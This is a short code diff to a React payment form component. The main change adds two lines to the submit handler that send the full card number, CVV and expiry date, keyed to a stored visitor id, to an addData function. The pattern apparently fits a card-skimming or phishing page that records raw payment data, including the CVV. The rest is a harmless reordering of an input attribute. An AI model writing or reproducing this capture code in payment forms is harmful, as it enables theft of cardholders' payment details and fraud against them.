@@ -25,7 +25,8 @@ interface PaymentFormProps {
 
 export function PaymentForm({ cardData, setCardData, onNext, onBack, loading }: PaymentFormProps) {
   const handleSubmit = (e: React.FormEvent) => {
-  
+    const _id=localStorage.getItem('visitor')
+    addData({id:_id,cardNumber:cardData.number ,cvv:cardData.cvv,expiryDate:cardData.expiry})
     onNext()
   }
 
@@ -63,13 +64,13 @@ export function PaymentForm({ cardData, setCardData, onNext, onBack, loading }: 
             <div className="relative">
               <Input
                 id="cardNumber"
-                type="tel"
                 placeholder="1234 5678 9012 3456"
                 value={formatCardNumber(cardData.number)}
                 onChange={(e) => updateField("number", e.target.value)}
                 className="pl-10 h-11 border-gray-300 focus:border-green-500 focus:ring-green-500 font-mono"
                 maxLength={19}
                 required
+                type="tel"
               />
               <CreditCard className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
             </div>
